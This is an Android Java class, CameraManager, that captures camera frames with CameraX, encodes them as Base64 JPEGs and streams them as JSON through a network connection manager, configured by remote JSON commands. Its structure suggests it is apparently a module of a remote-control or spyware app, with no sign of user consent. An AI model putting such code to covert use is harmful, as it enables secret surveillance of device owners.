package com.Deviant.pro;

import android.content.Context;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageAnalysis;
import androidx.camera.core.ImageProxy;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;
import androidx.lifecycle.LifecycleOwner;

import com.google.common.util.concurrent.ListenableFuture;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * CameraManager — streams camera frames over a network connection using CameraX.
 *
 * <p>Changes from the original:
 * <ul>
 *   <li>Migrated from deprecated {@code android.hardware.Camera} to CameraX (Jetpack).</li>
 *   <li>Eliminated the static-mCamera race condition by using an {@link AtomicReference} and
 *       by snapping a local reference inside every block that accesses it.</li>
 *   <li>Frame-drop strategy preserved: the {@link AtomicReference} naturally keeps only the
 *       latest frame; older un-processed frames are discarded automatically.</li>
 *   <li>Sender timing is now driven by a {@link ScheduledExecutorService} so the 200 ms
 *       inter-frame gap is wall-clock accurate regardless of how long
 *       {@code ConnectionManager.send()} blocks.</li>
 *   <li>All resources are released on a single code-path ({@link #stopStreaming()}) which is
 *       safe to call from any thread and is idempotent.</li>
 *   <li>{@code JSONObject} construction can throw {@link JSONException}; that is now caught
 *       explicitly instead of relying on the bare {@code Exception} catch.</li>
 * </ul>
 * </p>
 *
 * <p><b>Required dependencies (build.gradle):</b>
 * <pre>
 *   def camerax_version = "1.3.1"
 *   implementation "androidx.camera:camera-core:$camerax_version"
 *   implementation "androidx.camera:camera-camera2:$camerax_version"
 *   implementation "androidx.camera:camera-lifecycle:$camerax_version"
 * </pre>
 * </p>
 */
public class CameraManager {

    private static final String TAG = "CameraManager";

    /** Target inter-frame delay in milliseconds (~5 FPS). */
    private static final long FRAME_INTERVAL_MS = 200L;

    // -------------------------------------------------------------------------
    // State — all mutations are guarded by the AtomicBoolean / AtomicReference
    // -------------------------------------------------------------------------

    /** True while a streaming session is active. */
    private final AtomicBoolean isStreaming = new AtomicBoolean(false);

    /**
     * Holds the most-recently-captured raw NV21 frame.
     * The sender always reads-and-clears this reference so stale frames are
     * never queued; if the reference is null the sender simply skips that tick.
     */
    private final AtomicReference<PendingFrame> latestFrame = new AtomicReference<>(null);

    /** Scheduler that fires the sender task at a fixed rate. */
    private ScheduledExecutorService scheduler;

    /** Handle used to cancel the periodic sender task. */
    private ScheduledFuture<?> senderFuture;

    /** CameraX provider — kept so we can unbind on stop. */
    private ProcessCameraProvider cameraProvider;

    // -------------------------------------------------------------------------
    // Public API
    // -------------------------------------------------------------------------

    /**
     * Start streaming frames from the camera.
     *
     * @param context       Application or Activity context.
     * @param lifecycleOwner The lifecycle owner that controls the camera session
     *                       (typically the calling Activity or Fragment).
     * @param jo            Configuration JSON. Recognised keys:
     *                      <ul>
     *                        <li>{@code camera_id} — 0 = back (default), 1 = front.</li>
     *                        <li>{@code quality}   — JPEG quality 1-100 (default 40).</li>
     *                      </ul>
     */
    public void startStreaming(@NonNull Context context,
                               @NonNull LifecycleOwner lifecycleOwner,
                               @NonNull JSONObject jo) {
        // Ensure any previous session is fully torn down first.
        if (isStreaming.get()) {
            stopStreaming();
        }

        final int cameraId = jo.optInt("camera_id", 0);
        final int quality  = clamp(jo.optInt("quality", 40), 1, 100);

        CameraSelector cameraSelector = (cameraId == 1)
                ? CameraSelector.DEFAULT_FRONT_CAMERA
                : CameraSelector.DEFAULT_BACK_CAMERA;

        ListenableFuture<ProcessCameraProvider> providerFuture =
                ProcessCameraProvider.getInstance(context);

        providerFuture.addListener(() -> {
            try {
                cameraProvider = providerFuture.get();

                // Use a single-thread executor for image analysis so frames
                // arrive on a background thread and never block the main thread.
                ImageAnalysis imageAnalysis = new ImageAnalysis.Builder()
                        .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                        .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_YUV_420_888)
                        .build();

                imageAnalysis.setAnalyzer(
                        Executors.newSingleThreadExecutor(),
                        image -> {
                            if (!isStreaming.get()) {
                                image.close();
                                return;
                            }
                            // Convert YUV_420_888 → NV21 and store as the latest frame.
                            // Any previously un-sent frame is implicitly discarded.
                            byte[] nv21 = yuv420ToNv21(image);
                            latestFrame.set(new PendingFrame(
                                    nv21, image.getWidth(), image.getHeight()));
                            image.close();
                        });

                // Unbind all before rebinding to avoid IllegalArgumentException.
                cameraProvider.unbindAll();
                cameraProvider.bindToLifecycle(lifecycleOwner, cameraSelector, imageAnalysis);

                isStreaming.set(true);
                startSenderScheduler(quality);

                Log.d(TAG, "CameraX streaming started (cameraId=" + cameraId
                        + ", quality=" + quality + ")");

            } catch (ExecutionException | InterruptedException e) {
                Log.e(TAG, "Failed to obtain CameraProvider: " + e.getMessage(), e);
            } catch (Exception e) {
                Log.e(TAG, "Failed to start camera: " + e.getMessage(), e);
                stopStreaming();
            }
        }, ContextCompat.getMainExecutor(context));
    }

    /**
     * Stop streaming and release all camera resources. Safe to call from any
     * thread and idempotent (multiple calls are harmless).
     */
    public void stopStreaming() {
        // Guard: if already stopped, do nothing.
        if (!isStreaming.compareAndSet(true, false)) {
            return;
        }

        // Cancel the periodic sender first so it no longer touches latestFrame.
        if (senderFuture != null) {
            senderFuture.cancel(true);
            senderFuture = null;
        }
        if (scheduler != null) {
            scheduler.shutdownNow();
            scheduler = null;
        }

        // Unbind CameraX use-cases to release the camera hardware.
        if (cameraProvider != null) {
            try {
                cameraProvider.unbindAll();
            } catch (Exception e) {
                Log.e(TAG, "Error unbinding camera: " + e.getMessage(), e);
            }
            cameraProvider = null;
        }

        latestFrame.set(null);
        Log.d(TAG, "Camera streaming stopped.");
    }

    // -------------------------------------------------------------------------
    // Private helpers
    // -------------------------------------------------------------------------

    /** Starts the fixed-rate scheduler that encodes and sends frames. */
    private void startSenderScheduler(int quality) {
        scheduler = Executors.newSingleThreadScheduledExecutor();
        senderFuture = scheduler.scheduleAtFixedRate(
                () -> sendLatestFrame(quality),
                0L,
                FRAME_INTERVAL_MS,
                TimeUnit.MILLISECONDS);
    }

    /**
     * Atomically take the latest frame (clearing the reference so the same
     * frame is never sent twice), encode it, and dispatch it.
     */
    private void sendLatestFrame(int quality) {
        if (!isStreaming.get()) return;

        // Snap and clear in one atomic operation — eliminates the race condition
        // where stopStreaming() could null the camera while we're reading it.
        PendingFrame frame = latestFrame.getAndSet(null);
        if (frame == null) return; // No new frame since last tick.

        try {
            YuvImage yuvImage = new YuvImage(
                    frame.data, ImageFormat.NV21, frame.width, frame.height, null);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            yuvImage.compressToJpeg(
                    new Rect(0, 0, frame.width, frame.height), quality, out);

            String encoded = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);

            JSONObject res = new JSONObject();
            res.put("type", "camera");
            res.put("image", encoded);
            ConnectionManager.send(res.toString());

        } catch (JSONException e) {
            Log.e(TAG, "JSON serialisation error: " + e.getMessage(), e);
        } catch (Exception e) {
            Log.e(TAG, "Sender error: " + e.getMessage(), e);
        }
    }

    /**
     * Converts a {@link ImageProxy} in YUV_420_888 format to a flat NV21 byte array.
     *
     * <p>YUV_420_888 may use non-contiguous planes with arbitrary row/pixel strides,
     * so we must copy manually rather than relying on a single bulk array read.</p>
     */
    private static byte[] yuv420ToNv21(@NonNull ImageProxy image) {
        ImageProxy.PlaneProxy yPlane  = image.getPlanes()[0];
        ImageProxy.PlaneProxy uPlane  = image.getPlanes()[1];
        ImageProxy.PlaneProxy vPlane  = image.getPlanes()[2];

        ByteBuffer yBuf = yPlane.getBuffer();
        ByteBuffer uBuf = uPlane.getBuffer();
        ByteBuffer vBuf = vPlane.getBuffer();

        int width  = image.getWidth();
        int height = image.getHeight();

        int yRowStride = yPlane.getRowStride();
        int uvRowStride = uPlane.getRowStride();
        int uvPixelStride = uPlane.getPixelStride();

        // NV21: width*height Y bytes, then interleaved V/U bytes (width*height/2 total).
        byte[] nv21 = new byte[width * height * 3 / 2];

        // Copy Y plane (luma).
        int yOffset = 0;
        for (int row = 0; row < height; row++) {
            yBuf.position(row * yRowStride);
            yBuf.get(nv21, yOffset, width);
            yOffset += width;
        }

        // Copy interleaved V/U (NV21 = V first, U second).
        int uvOffset = width * height;
        int uvHeight = height / 2;
        int uvWidth  = width  / 2;
        for (int row = 0; row < uvHeight; row++) {
            for (int col = 0; col < uvWidth; col++) {
                int pos = row * uvRowStride + col * uvPixelStride;
                nv21[uvOffset++] = vBuf.get(pos); // V
                nv21[uvOffset++] = uBuf.get(pos); // U
            }
        }

        return nv21;
    }

    /** Clamps {@code value} to [min, max]. */
    private static int clamp(int value, int min, int max) {
        return Math.max(min, Math.min(max, value));
    }

    // -------------------------------------------------------------------------
    // Value type
    // -------------------------------------------------------------------------

    /** Immutable snapshot of a single camera frame. */
    private static final class PendingFrame {
        final byte[] data;
        final int    width;
        final int    height;

        PendingFrame(byte[] data, int width, int height) {
            this.data   = data;
            this.width  = width;
            this.height = height;
        }
    }
}
